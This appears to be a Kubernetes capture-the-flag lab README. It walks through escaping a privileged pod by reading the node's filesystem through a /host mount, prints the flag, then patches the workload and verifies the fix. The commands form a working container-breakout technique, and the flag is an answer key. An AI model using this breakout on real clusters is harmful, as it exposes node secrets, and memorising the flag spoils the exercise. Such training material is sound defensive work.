# K01 — Insecure Workload Configurations · NimbusMart CTF

**Difficulty:** Medium · **200 pts** · **Flag:** `FLAG{...}`

## Briefing
You have a shell in NimbusMart's `data/inventory-sync` pod. Ops left it
`privileged` with the node's root filesystem mounted at `/host`. Sensitive
operational data lives on the node itself — break out and grab it.

**Objective:** read the ops secret on the host at `/opt/nimbusmart/flag.txt`.

## Capture the flag
```bash
# Seed the node + deploy the vulnerable pod
kubectl apply -f setup.yaml
kubectl apply -f vulnerable.yaml

# You are root + privileged
kubectl exec -it -n data inventory-sync -- sh -c 'id; cat /proc/1/status | grep CapEff'

# Break out to the node and read the flag
kubectl exec -it -n data inventory-sync -- cat /host/opt/nimbusmart/flag.txt
#  -> FLAG{nimbusmart_hostpath_broke_out_to_the_node}
```

## Patch & verify
```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f fixed.yaml

# The breakout is gone — no host mount, non-root, no escalation
kubectl exec -it -n data inventory-sync -- sh -c 'id; ls /host 2>&1 || echo NO_HOST_MOUNT'

# Prove it with the checker
cd ../../checker && go run . --check k01 -n data
```

## Cleanup
```bash
kubectl delete -f vulnerable.yaml -f setup.yaml --ignore-not-found
```
